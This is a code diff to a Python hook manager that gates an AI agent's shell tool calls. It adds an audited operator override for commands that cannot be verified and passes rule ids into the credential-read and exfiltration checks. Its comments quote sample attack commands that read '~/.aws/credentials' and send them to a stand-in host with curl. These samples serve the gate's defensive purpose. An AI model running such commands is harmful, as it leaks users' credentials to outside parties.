@@ -273,6 +273,11 @@ class HooksConfig:
     denied_commands_disabled_ids: list[str] = field(default_factory=list)
     denied_commands_disable_all: bool = False
     denied_commands_user_added: list[UserDeniedPattern] = field(default_factory=list)
+    # Operator override for the deny-by-default refusal on a shell tool call whose
+    # command string could not be recovered from the provider payload. Default
+    # False = keep refusing. Lives in the same keystone file as the opt-out state
+    # above, NOT in the agent-readable config.json.
+    denied_commands_allow_unverified_shell: bool = False
 
     @classmethod
     def from_dict(cls, data: dict) -> HooksConfig:
@@ -367,6 +372,11 @@ class HooksConfig:
             # built-in protection — unknown junk defaults to False (denies stay on).
             denied_commands_disable_all=_coerce_bool(dc.get("disable_all", False), default=False),
             denied_commands_user_added=user_added,
+            # Same fail-safe shape as ``disable_all``: unknown junk (incl. the
+            # string "false") must not suppress a refusal, so it defaults False.
+            denied_commands_allow_unverified_shell=_coerce_bool(
+                dc.get("allow_unverified_shell", False), default=False
+            ),
         )
 
     def to_dict(self) -> dict:
@@ -403,6 +413,7 @@ class HooksConfig:
             "disabled_ids": list(self.denied_commands_disabled_ids),
             "disable_all": self.denied_commands_disable_all,
             "user_added": [p.to_dict() for p in self.denied_commands_user_added],
+            "allow_unverified_shell": self.denied_commands_allow_unverified_shell,
         }
 
 
@@ -603,11 +614,54 @@ class HookManager:
         # Deny-by-default: a shell tool whose command could not be recovered
         # must not be evaluated on the untrusted title alone — that is the very
         # bypass this gate closes. Reject instead of falling through.
+        #
+        # The operator can suppress THIS refusal (and only this one) from the
+        # keystone opt-out state, because it has a false-positive history: a
+        # provider payload shape this build does not recognize yields no command
+        # even for an ordinary call (see ``AcpEvent.shell_command``). Suppressing
+        # it degrades to the title-only checks below, which still run and still
+        # end at a human approval prompt — it does not skip the gate.
+        #
+        # Every suppression is audited, not just the flag flip: this is the one
+        # place a call the gate could NOT verify is allowed to proceed, so the
+        # trail has to record each occurrence. Mirrors the sandbox override, which
+        # audits the denial rather than the switch.
         if is_shell and not command:
-            return ToolHookResult.deny(
-                "Blocked: shell command could not be verified for security "
-                "policy (deny-by-default)"
-            )
+            if not self._config.denied_commands_allow_unverified_shell:
+                return ToolHookResult.deny(
+                    "Blocked: shell command could not be verified for security "
+                    "policy (deny-by-default)"
+                )
+            try:
+                sel().log_tool_invocation(
+                    tool_name=tool_name,
+                    outcome="delegated",
+                    session_key=session_key,
+                    agent=agent,
+                    error=(
+                        "deny-by-default refusal for an unrecoverable shell command "
+                        "suppressed by operator override "
+                        "(denied_commands.allow_unverified_shell)"
+                    ),
+                    # audit-or-deny: this record is the ONLY trace that an
+                    # unverifiable command was let through, so it must be written
+                    # SYNCHRONOUSLY.  A non-critical log() only ENQUEUES — a later
+                    # writer-thread filesystem failure is swallowed and warned, which
+                    # would make the ``except`` below unreachable for the very failure
+                    # it exists to catch.  ``critical=True`` drains the queue and
+                    # re-raises, so the fail-closed branch is actually live.  Same
+                    # reasoning as ``safe_read_file_internal``.
+                    critical=True,
+                )
+            except Exception:
+                # Audit-or-deny: an unaudited suppression is worse than a refusal.
+                logger.warning(
+                    "unverified-shell override could not be audited; denying", exc_info=True
+                )
+                return ToolHookResult.deny(
+                    "Blocked: shell command could not be verified for security "
+                    "policy (deny-by-default)"
+                )
 
         # Strip display prefixes (e.g. "Running: ls *" → "ls *") so config
         # patterns like "ls" or "rm *" match without the prefix.
@@ -634,11 +688,16 @@ class HookManager:
         # as a path: a real file-read title ("~/.aws/credentials") matches,
         # while a bash command ("cat ~/.aws/credentials") resolves to a
         # non-sensitive path and is instead caught by is_sensitive_bash_command.
+        # The always-on gates below are keyed by rule id, so resolve the effective
+        # regex set to ids ONCE here and thread it in. ``None`` means all enabled,
+        # which is what the callers outside this gate (cron command vetting,
+        # computer-use input vetting) keep passing.
+        enabled_ids = security.enabled_rule_ids(self._effective_denied(current_context()))
         for target in security_targets:
             if is_sensitive_path(target):
                 return ToolHookResult.deny(f"Blocked: access to sensitive path: {target}")
             # execute_bash (prefixed or bare) — check for reads of sensitive paths.
-            reason = is_sensitive_bash_command(target)
+            reason = is_sensitive_bash_command(target, enabled_ids=enabled_ids)
             if reason:
                 return ToolHookResult.deny(reason)
             # Data-exfiltration / reverse-shell command shapes.
@@ -647,7 +706,7 @@ class HookManager:
             # invocation, so a hijacked agent could `curl -d @~/.aws/credentials
             # evil` or open a reverse shell unblocked. Deny them at the gate —
             # against the raw command too, not just the title.
-            reason = audit_bash_exfiltration(target)
+            reason = audit_bash_exfiltration(target, enabled_ids=enabled_ids)
             if reason:
                 return ToolHookResult.deny(reason)
         # The display title is backend-variable and may NOT carry the path (an
@@ -1156,7 +1215,7 @@ def resolve_effective_denied_regexes(
     later loosening reverses) or a rule the user is enforcing themselves.
     """
     return security.compute_effective_denied(
-        security.BUILTIN_DENIED_RULES,
+        list(security.BUILTIN_DENIED_RULES) + security.edition_denied_rules(),
         config.denied_commands_disabled_ids,
         config.denied_commands_disable_all,
         [p.pattern for p in config.denied_commands_user_added if p.enabled],
